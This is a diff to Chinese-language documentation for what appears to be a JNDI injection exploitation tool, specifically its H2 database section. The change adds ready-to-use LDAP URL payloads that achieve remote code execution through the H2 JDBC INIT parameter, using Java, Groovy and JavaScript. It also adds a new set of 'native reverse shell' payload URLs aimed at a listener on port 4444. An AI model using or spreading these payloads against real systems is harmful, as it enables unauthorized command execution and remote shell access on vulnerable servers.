@@ -236,14 +236,19 @@ ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
 
 #### H2
 
-通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句
+通过 H2 JDBC URL 的 INIT 参数执行 SQL 语句, 支持命令执行和原生反弹 Shell
 
 三种方式 RCE: CREATE ALIAS + Java/Groovy, CREATE TRIGGER + JavaScript
 
 ```bash
-ldap://127.0.0.1:1389/Factory/H2/Java/open -a Calculator
-ldap://127.0.0.1:1389/Factory/H2/Groovy/open -a Calculator
-ldap://127.0.0.1:1389/Factory/H2/JavaScript/open -a Calculator
+# 命令执行
+ldap://127.0.0.1:1389/Factory/H2/Java/Command/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/Groovy/Command/open -a Calculator
+ldap://127.0.0.1:1389/Factory/H2/JavaScript/Command/open -a Calculator
+
+# 原生反弹 Shell (暂不支持 Groovy)
+ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```
 
 #### Derby
